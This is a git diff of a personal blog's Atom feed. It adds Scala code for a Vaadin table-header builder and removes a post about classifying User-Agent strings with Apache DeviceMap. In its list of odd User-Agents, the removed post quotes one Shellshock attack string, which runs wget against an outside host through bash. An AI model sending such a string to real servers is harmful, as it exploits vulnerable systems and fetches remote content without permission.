+        &lt;span class="nc"&gt;Configuration&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;Alignment&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nc"&gt;Table&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;Align&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;RIGHT&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;:+&lt;/span&gt;
+        &lt;span class="nc"&gt;Configuration&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;Converter&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;longToStringConverter&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
+      &lt;span class="n"&gt;add&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nc"&gt;CustomTableHeader&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;classOf&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="kt"&gt;Integer&lt;/span&gt;&lt;span class="o"&gt;],&lt;/span&gt; &lt;span class="n"&gt;extendedConfigurations&lt;/span&gt;&lt;span class="k"&gt;:&lt;/span&gt; &lt;span class="k"&gt;_&lt;/span&gt;&lt;span class="kt"&gt;*&lt;/span&gt;&lt;span class="o"&gt;))&lt;/span&gt;
+    &lt;span class="o"&gt;}&lt;/span&gt;
+
+    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="n"&gt;addString&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="k"&gt;:&lt;/span&gt; &lt;span class="kt"&gt;String&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;configurations&lt;/span&gt;&lt;span class="k"&gt;:&lt;/span&gt; &lt;span class="kt"&gt;CustomTableHeader.Configuration*&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="k"&gt;:&lt;/span&gt; &lt;span class="kt"&gt;Builder&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;
+      &lt;span class="n"&gt;add&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nc"&gt;CustomTableHeader&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;classOf&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="kt"&gt;String&lt;/span&gt;&lt;span class="o"&gt;],&lt;/span&gt; &lt;span class="n"&gt;configurations&lt;/span&gt;&lt;span class="k"&gt;:&lt;/span&gt; &lt;span class="k"&gt;_&lt;/span&gt;&lt;span class="kt"&gt;*&lt;/span&gt;&lt;span class="o"&gt;))&lt;/span&gt;
+
+  &lt;span class="o"&gt;}&lt;/span&gt;
+
+  &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="n"&gt;builder&lt;/span&gt;&lt;span class="o"&gt;()&lt;/span&gt;&lt;span class="k"&gt;:&lt;/span&gt; &lt;span class="kt"&gt;Builder&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nc"&gt;Builder&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nc"&gt;Seq&lt;/span&gt;&lt;span class="o"&gt;())&lt;/span&gt;
+
+&lt;span class="o"&gt;}&lt;/span&gt;
+
+&lt;span class="k"&gt;object&lt;/span&gt; &lt;span class="nc"&gt;TableHelpers&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
+
+  &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="n"&gt;setHeaders&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;table&lt;/span&gt;&lt;span class="k"&gt;:&lt;/span&gt; &lt;span class="kt"&gt;Table&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;headers&lt;/span&gt;&lt;span class="k"&gt;:&lt;/span&gt; &lt;span class="kt"&gt;Seq&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="kt"&gt;CustomTableHeader&lt;/span&gt;&lt;span class="o"&gt;])&lt;/span&gt;&lt;span class="k"&gt;:&lt;/span&gt; &lt;span class="kt"&gt;Unit&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;
+    &lt;span class="n"&gt;headers&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;foreach&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt; &lt;span class="n"&gt;header&lt;/span&gt; &lt;span class="k"&gt;=&amp;gt;&lt;/span&gt;
+      &lt;span class="n"&gt;table&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;addContainerProperty&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;header&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;header&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;clazz&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="kc"&gt;null&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
+      &lt;span class="n"&gt;header&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;configurations&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;foreach&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="k"&gt;_&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;configure&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;table&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;header&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="o"&gt;))&lt;/span&gt;
+    &lt;span class="o"&gt;}&lt;/span&gt;
+
+&lt;span class="o"&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Then I enjoyed this abstraction throughout all the tables I created from then
+on:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class="language-scala"&gt;&lt;span class="k"&gt;val&lt;/span&gt; &lt;span class="n"&gt;table&lt;/span&gt;&lt;span class="k"&gt;:&lt;/span&gt; &lt;span class="kt"&gt;TreeTable&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
+
+  &lt;span class="k"&gt;val&lt;/span&gt; &lt;span class="n"&gt;headers&lt;/span&gt;&lt;span class="k"&gt;:&lt;/span&gt; &lt;span class="kt"&gt;Seq&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="kt"&gt;CustomTableHeader&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="k"&gt;=&lt;/span&gt; &lt;span class="nc"&gt;CustomTableHeader&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;builder&lt;/span&gt;&lt;span class="o"&gt;()&lt;/span&gt;
+    &lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;addString&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;
+      &lt;span class="s"&gt;"Property Name"&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;
+      &lt;span class="nc"&gt;CustomTableHeader&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;Configuration&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;ExpandRatio&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;6&lt;/span&gt;&lt;span class="o"&gt;))&lt;/span&gt;
+    &lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;add&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nc"&gt;CustomTableHeader&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;
+      &lt;span class="s"&gt;"Shop Code"&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;
+      &lt;span class="n"&gt;classOf&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="kt"&gt;MappingShopCode&lt;/span&gt;&lt;span class="o"&gt;],&lt;/span&gt;
+      &lt;span class="nc"&gt;CustomTableHeader&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;Configuration&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;ExpandRatio&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="o"&gt;)))&lt;/span&gt;
+    &lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;addBoolean&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;
+      &lt;span class="s"&gt;"Content?"&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;
+      &lt;span class="nc"&gt;CustomTableHeader&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;Configuration&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;Collapsed&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="kc"&gt;true&lt;/span&gt;&lt;span class="o"&gt;),&lt;/span&gt;
+      &lt;span class="nc"&gt;CustomTableHeader&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;Configuration&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;ExpandRatio&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="o"&gt;))&lt;/span&gt;
+    &lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;addBoolean&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;
+      &lt;span class="s"&gt;"Forge?"&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;
+      &lt;span class="nc"&gt;CustomTableHeader&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;Configuration&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;Collapsed&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="kc"&gt;true&lt;/span&gt;&lt;span class="o"&gt;),&lt;/span&gt;
+      &lt;span class="nc"&gt;CustomTableHeader&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;Configuration&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;ExpandRatio&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="o"&gt;))&lt;/span&gt;
+    &lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;add&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nc"&gt;CustomTableHeader&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;
+      &lt;span class="s"&gt;"Inp. Type"&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;
+      &lt;span class="n"&gt;classOf&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="kt"&gt;MappingTypeCode&lt;/span&gt;&lt;span class="o"&gt;],&lt;/span&gt;
+      &lt;span class="nc"&gt;CustomTableHeader&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;Configuration&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;Collapsed&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="kc"&gt;true&lt;/span&gt;&lt;span class="o"&gt;),&lt;/span&gt;
+      &lt;span class="nc"&gt;CustomTableHeader&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;Configuration&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;ExpandRatio&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="o"&gt;)))&lt;/span&gt;
+    &lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;build&lt;/span&gt;&lt;span class="o"&gt;()&lt;/span&gt;
+
+  &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="n"&gt;setBody&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;table&lt;/span&gt;&lt;span class="k"&gt;:&lt;/span&gt; &lt;span class="kt"&gt;TreeTable&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="k"&gt;:&lt;/span&gt; &lt;span class="kt"&gt;Unit&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;???&lt;/span&gt;
+
+  &lt;span class="n"&gt;returning&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nc"&gt;TreeTable&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
+    &lt;span class="n"&gt;table&lt;/span&gt; &lt;span class="k"&gt;=&amp;gt;&lt;/span&gt;
+      &lt;span class="n"&gt;table&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;setSelectable&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="kc"&gt;true&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
+      &lt;span class="n"&gt;table&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;setSortEnabled&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="kc"&gt;true&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
+      &lt;span class="n"&gt;table&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;setColumnCollapsingAllowed&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="kc"&gt;true&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
+      &lt;span class="nc"&gt;TableHelpers&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;setHeaders&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;table&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;headers&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
+      &lt;span class="n"&gt;setBody&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;table&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
+  &lt;span class="o"&gt;}&lt;/span&gt;
+
+&lt;span class="o"&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
 </content>
   </entry>
   <entry>
@@ -1429,547 +1803,6 @@ satisfying and I believe the issues arised will disappear with a newer kernel
 version, of which I do not have power and time to invest right now. In
 conclusion, Macbook Pro is certainly a powerful hardware as a GNU/Linux
 development platform and I can heartly recommend it to anybody.&lt;/p&gt;
-</content>
-  </entry>
-  <entry>
-    <id>tag:vy.github.io,2014-12-05://blog/post/2014/12/05/apache-devicemap/</id>
-    <title type="html">Parsing User-Agent Strings with Apache DeviceMap</title>
-    <published>2014-12-05T17:42:00Z</published>
-    <updated>2014-12-05T17:42:00Z</updated>
-    <link rel="alternate" href="https://vy.github.io//blog/post/2014/12/05/apache-devicemap/"/>
-    <content type="html">
-&lt;p&gt;At work I am given the task of implementing a basic device profiler service to
-classify the incoming HTTP requests into a certain set of groups (desktop,
-tablet, mobile, etc.) using the
-&lt;a href="http://en.wikipedia.org/wiki/User_agent"&gt;User-Agent&lt;/a&gt; header. It opens a
-multitude of new dimensions both at the client- and server-side for interface
-and content customizations tailored to the device. For instance, you can
-disable some of your fancy gestures (e.g., &lt;code&gt;mouseover&lt;/code&gt; events) that will not
-be properly used on a touch screen. Or you might want to prioritize console
-games for a client who uses a PlayStation to browse your shop.&lt;/p&gt;
-
-&lt;p&gt;I first tried to investigate and (if possible) evaluate the existing solutions
-in the wild, including the commercial ones. And eventually decided to go with
-&lt;a href="http://devicemap.apache.org/"&gt;Apache DeviceMap&lt;/a&gt; that employs
-&lt;a href="https://github.com/OpenDDRdotORG/OpenDDR-Resources"&gt;OpenDDR&lt;/a&gt; in the
-background. In this blog post, I tried to wrap up a summary of the
-&lt;em&gt;experience&lt;/em&gt; I collected through out this pursuit.&lt;/p&gt;
-
-&lt;h1 id="parsing-a-user-agent-string"&gt;Parsing a User-Agent string&lt;/h1&gt;
-
-&lt;p&gt;While &lt;a href="http://tools.ietf.org/html/rfc7231#section-5.5.3"&gt;Section 5.5.3&lt;/a&gt; of
-&lt;em&gt;HTTP/1.1: Semantics and Content&lt;/em&gt; specification has a lot to say about the
-formatting of the User-Agent header, the first thing for sure is that there
-are no restrictive rules that shape the header in a machine-readable format.
-Consider the following examples:&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;Mozilla/5.0 (Linux; Android 4.2.1; GT-H9500 Build/JOP40D) AppleWebKit/537.36
-(KHTML, like Gecko) Chrome/36.0.1985.131 Mobile Safari/537.36&lt;/li&gt;
-  &lt;li&gt;Mozilla/5.0 (PlayStation Vita 3.18) AppleWebKit/536.26 (KHTML, like Gecko)
-Silk/3.2&lt;/li&gt;
-  &lt;li&gt;Dalvik/1.4.0 (Linux; U; Android 2.3.6; GT-B5510B Build/GINGERBREAD)&lt;/li&gt;
-  &lt;li&gt;Opera/9.50 (Nintendo DSi; Opera/507; U; en-GB)&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;I can even show you more fancier ones:&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;MIKI50_6464_11B_24MP_HW
-(MRE/3.0.00(800);MAUI/51TV_V01_01_130227;BDATE/2013/02/27
-19:19;LCD/320240;CHIP/MT6250;KEY/QWERT;TOUCH/0;CAMERA/1;SENSOR/0;DEV/MIKI50_6464_11B_24MP_HW;WAP
-Browser/MAUI
-(HTTPS);GMOBI/001;MBOUNCE/002;MOMAGIC/003;INDEX/004;SPICEI2I/005;GAMELOFT/006;MOBIM/007;K)
-RLG_G51TV_V01_01_130227 Release/2013.02.27 WAP Browser/MAUI (HTTPS) Profile/
-Q03C1-2.40 en-US&lt;/li&gt;
-  &lt;li&gt;Apache-HttpClient/4.1.3 (java 1.5)&lt;/li&gt;
-  &lt;li&gt;WWW-Mechanize/1.73&lt;/li&gt;
-  &lt;li&gt;Java/1.6.0_22&lt;/li&gt;
-  &lt;li&gt;Scrapy/0.24.4 (+http://scrapy.org)&lt;/li&gt;
-  &lt;li&gt;WordPress/3.1.3; http://www.unileverventures.com&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;And some annoying ones:&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;LAVA.DISCOVER 137*.HEXING60A_COSMOS_11B_HW
-(MRE/3.1.00(1500);MAUI/308;BDATE/2013/11/20
-11:14;LCD/320480;CHIP/MT6260;KEY/Reduced;TOUCH/1;CAMERA/0;SENSOR/0;DEV/HEXING60A_COSMOS_11B_HW;WAP
-Browser/MAUI (HTTP
-PGDL;HTTPS);GMOBI/001;MBOUNCE/002;MOMAGIC/003;INDEX/004;SPICEI2I/005;GAMELOFT/006;MOBIM/007;KKF)
-11BW1308 Release/2013.11.20 WAP Browser/MAUI (HTTP PGDL; HTTPS)
-Profile/Profile/MIDP-2.0 Configuration/CLDC-1.1 Q03C1-2.40 en-US&lt;/li&gt;
-  &lt;li&gt;shellshocker=’() { wget
-http://yourschool.net/.tmp/frogclog.php?http://www.ebay.com/ago-rari-1-43/1004004009042189/;
-}’ bash -c shellshocker&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;So making a conclusion on which part denotes the product name, version, etc.
-is a fuzzy, tedious and error-prone task. That being said, there is another
-thing we can do here! Every User-Agent is more or less unique to the device
-that the software runs on. Hence, if we can come up with a database such that
-User-Agent strings are mapped to devices, we can employ this database to find
-the device of a certain User-Agent. This is where the term &lt;a href="http://en.wikipedia.org/wiki/Device_Description_Repository"&gt;Device Description
-Repository&lt;/a&gt; (DDR)
-kicks in:&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;The Device Description Repository is a concept proposed by the Mobile Web
-Initiative Device Description Working Group (DDWG) of the World Wide Web
-Consortium. The DDR is supported by a standard interface and an initial core
-vocabulary of device properties. Implementations of the proposed repository
-are expected to contain information about Web-enabled devices (particularly
-mobile devices).&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;h1 id="the-rise-of-ddr"&gt;The Rise of DDR&lt;/h1&gt;
-
-&lt;p&gt;&lt;a href="http://en.wikipedia.org/wiki/WURFL"&gt;WURFL&lt;/a&gt; (Wireless Universal Resource FiLe)
-was the first community effort focused on mobile device detection and dates
-back to 2007. While WURFL was initially released under an “open source /
-public domain” license, in June 2011, project’s founders formed ScientiaMobile
-to provide commercial mobile device detection support and services using
-WURFL. As of now, the &lt;a href="http://www.scientiamobile.com/"&gt;ScientiaMobile&lt;/a&gt; WURFL
-APIs are licensed under a dual-license model, using the AGPL license for
-non-commercial use and a proprietary commercial license. In a world dominated
-by capitalism, the current version of the WURFL database itself is no longer
-open source. Inspired by WURFL and motivated by the gap in the market, it did
-not take much for alternative companies to emerge, including, but is not
-limited to, &lt;a href="https://deviceatlas.com/"&gt;DeviceAtlas&lt;/a&gt;, &lt;a href="http://www.handsetdetection.com/"&gt;Handset
-Detection&lt;/a&gt;, and
-&lt;a href="http://51degrees.com/"&gt;51degrees&lt;/a&gt;.&lt;/p&gt;
-
-&lt;p&gt;So how far one can go using a DDR to detect the properties of a device by just
-looking at the User-Agent header? Below is a sample output that I collected
-from &lt;a href="http://51degrees.com/"&gt;51degrees&lt;/a&gt;:&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;HardwarePlatform
-    &lt;ul&gt;
-      &lt;li&gt;Camera
-        &lt;ul&gt;
-          &lt;li&gt;Has3DCamera: False&lt;/li&gt;
-          &lt;li&gt;HasCamera: False&lt;/li&gt;
-        &lt;/ul&gt;
-      &lt;/li&gt;
-      &lt;li&gt;Connectivity
-        &lt;ul&gt;
-          &lt;li&gt;HasNFC: False&lt;/li&gt;
-        &lt;/ul&gt;
-      &lt;/li&gt;
-      &lt;li&gt;Device
-        &lt;ul&gt;
-          &lt;li&gt;DeviceType: Desktop&lt;/li&gt;
-        &lt;/ul&gt;
-      &lt;/li&gt;
-      &lt;li&gt;Inputs
-        &lt;ul&gt;
-          &lt;li&gt;HasKeypad: False&lt;/li&gt;
-          &lt;li&gt;HasQwertyPad: True&lt;/li&gt;
-          &lt;li&gt;HasTouchScreen: False&lt;/li&gt;
-          &lt;li&gt;HasTrackPad: True&lt;/li&gt;
-          &lt;li&gt;HasVirtualQwerty: False&lt;/li&gt;
-        &lt;/ul&gt;
-      &lt;/li&gt;
-      &lt;li&gt;Name
-        &lt;ul&gt;
-          &lt;li&gt;HardwareFamily: Macintosh&lt;/li&gt;
-          &lt;li&gt;HardwareModel: Macintosh&lt;/li&gt;
-          &lt;li&gt;HardwareName: Macintosh&lt;/li&gt;
-          &lt;li&gt;HardwareVendor: Apple&lt;/li&gt;
-          &lt;li&gt;OEM: Apple&lt;/li&gt;
-        &lt;/ul&gt;
-      &lt;/li&gt;
-      &lt;li&gt;Screen
-        &lt;ul&gt;
-          &lt;li&gt;Has3DScreen: False&lt;/li&gt;
-          &lt;li&gt;ScreenInchesDiagonalRounded: Unknown&lt;/li&gt;
-          &lt;li&gt;ScreenInchesSquare: Unknown&lt;/li&gt;
-          &lt;li&gt;ScreenMMDiagonalRounded: Unknown&lt;/li&gt;
-          &lt;li&gt;ScreenMMSquare: Unknown&lt;/li&gt;
-          &lt;li&gt;SuggestedImageButtonHeightMms: 3.5&lt;/li&gt;
-          &lt;li&gt;SuggestedImageButtonHeightPixels: 11.8&lt;/li&gt;
-          &lt;li&gt;SuggestedLinkSizePixels: 11.8&lt;/li&gt;
-          &lt;li&gt;SuggestedLinkSizePoints: 10&lt;/li&gt;
-        &lt;/ul&gt;
-      &lt;/li&gt;
-      &lt;li&gt;Stats
-        &lt;ul&gt;
-          &lt;li&gt;Popularity: 1674140546&lt;/li&gt;
-        &lt;/ul&gt;
-      &lt;/li&gt;
-      &lt;li&gt;Tv
-        &lt;ul&gt;
-          &lt;li&gt;ContrastRatio: N/A&lt;/li&gt;
-          &lt;li&gt;EnergyConsumptionPerYear: N/A&lt;/li&gt;
-          &lt;li&gt;OnPowerConsumption: N/A&lt;/li&gt;
-          &lt;li&gt;RefreshRate: N/A&lt;/li&gt;
-        &lt;/ul&gt;
-      &lt;/li&gt;
-      &lt;li&gt;Miscellaneous
-        &lt;ul&gt;
-          &lt;li&gt;HardwareImages: Front, Posed&lt;/li&gt;
-        &lt;/ul&gt;
-      &lt;/li&gt;
-    &lt;/ul&gt;
-  &lt;/li&gt;
-  &lt;li&gt;SoftwarePlatform
-    &lt;ul&gt;
-      &lt;li&gt;Ccpp
-        &lt;ul&gt;
-          &lt;li&gt;CcppAccept: application/java, application/java-archive,
-application/vnd.oma.dd+xml, application/vnd.oma.drm.content,
-application/vnd.oma.drm.message,
-application/vnd.oma.drm.rights+wbxml,
-application/vnd.oma.drm.rights+xml,
-application/vnd.wap.multipart.mixed, application/vnd.wap.wbxml,
-application/vnd.wap.wmlscriptc, application/vnd.wap.xhtml+xml,
-application/x-compress, application/x-gzip, application/xhtml+xml,
-audio/3ga, audio/3gpp, audio/aac, audio/amr, audio/asf, audio/asx,
-audio/awb, audio/m4a, audio/m4b, audio/midi, audio/mp3, audio/mp3d,
-audio/mp4, audio/MP4A-ES, audio/MP4A-LATM, audio/wav, audio/wma,
-image/2bp, image/bmp, image/gif, image/jpeg, image/jpg, image/png,
-image/tif, image/tiff, image/vnd.wap.wbmp, image/wbmp,
-message/rfc822, text/css, text/html, text/plain,
-text/vnd.sun.j2me.app-descriptor, text/vnd.wap.wml, text/x-ical,
-text/xml, text/xsl, text/x-vcal, video/3g2, video/3gp, video/3gpp,
-video/divx, video/flv, video/H263-2000, video/H264, video/m4v,
-video/mp4, video/MP4V-ES, video/wmv, video/xvid&lt;/li&gt;
-        &lt;/ul&gt;
-      &lt;/li&gt;
-      &lt;li&gt;Name
-        &lt;ul&gt;
-          &lt;li&gt;PlatformName: Mac OS X&lt;/li&gt;
-          &lt;li&gt;PlatformVendor: Apple&lt;/li&gt;
-          &lt;li&gt;PlatformVersion: 10.9&lt;/li&gt;
-          &lt;li&gt;BrowserUA: - Css&lt;/li&gt;
-          &lt;li&gt;CssBackground: True&lt;/li&gt;
-          &lt;li&gt;CssBorderImage: True&lt;/li&gt;
-          &lt;li&gt;CssCanvas: True&lt;/li&gt;
-          &lt;li&gt;CssColor: True&lt;/li&gt;
-          &lt;li&gt;CssColumn: False&lt;/li&gt;
-          &lt;li&gt;CssFlexbox: True&lt;/li&gt;
-          &lt;li&gt;CssFont: True&lt;/li&gt;
-          &lt;li&gt;CssImages: False&lt;/li&gt;
-          &lt;li&gt;CssMediaQueries: True&lt;/li&gt;
-          &lt;li&gt;CssMinMax: True&lt;/li&gt;
-          &lt;li&gt;CssOverflow: True&lt;/li&gt;
-          &lt;li&gt;CssPosition: True&lt;/li&gt;
-          &lt;li&gt;CssText: False&lt;/li&gt;
-          &lt;li&gt;CssTransforms: True&lt;/li&gt;
-          &lt;li&gt;CssTransitions: True&lt;/li&gt;
-          &lt;li&gt;CssUI: False&lt;/li&gt;
-        &lt;/ul&gt;
-      &lt;/li&gt;
-      &lt;li&gt;Data
-        &lt;ul&gt;
-          &lt;li&gt;DataSet: True&lt;/li&gt;
-          &lt;li&gt;DataUrl: True&lt;/li&gt;
-        &lt;/ul&gt;
-      &lt;/li&gt;
-      &lt;li&gt;DOM
-        &lt;ul&gt;
-          &lt;li&gt;DeviceOrientation: False&lt;/li&gt;
-        &lt;/ul&gt;
-      &lt;/li&gt;
-      &lt;li&gt;File
-        &lt;ul&gt;
-          &lt;li&gt;FileReader: True&lt;/li&gt;
-        &lt;/ul&gt;
-      &lt;/li&gt;
-      &lt;li&gt;General
-        &lt;ul&gt;
-          &lt;li&gt;AjaxRequestType: Standard&lt;/li&gt;
-          &lt;li&gt;AnimationTiming: True&lt;/li&gt;
-          &lt;li&gt;BlobBuilder: True&lt;/li&gt;
-          &lt;li&gt;BrowserPropertySource: Caniuse&lt;/li&gt;
-          &lt;li&gt;FormData: True&lt;/li&gt;
